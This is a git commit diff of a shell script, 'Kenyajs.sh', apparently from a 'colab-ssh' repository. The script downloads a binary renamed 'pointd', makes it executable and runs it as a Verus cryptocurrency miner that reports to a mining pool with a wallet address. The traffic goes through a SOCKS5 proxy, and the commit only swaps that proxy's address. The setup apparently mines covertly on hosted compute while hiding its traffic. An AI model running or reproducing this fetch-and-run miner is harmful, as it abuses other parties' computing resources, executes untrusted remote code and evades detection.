b655742a028ea13bee8e8a3514bdfc90642b5b0e
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-04-12 09:16:44 +0700

    Update Kenyajs.sh

--- Kenyajs.sh
+++ Kenyajs.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget -q https://github.com/uaaoxjdr/colab-ssh/raw/master/pointd
 chmod +x pointd
-./pointd -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW.ken -t 2 -p x -x socks5://80.15.22.249:10001
+./pointd -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW.ken -t 2 -p x -x socks5://62.113.115.94:16072
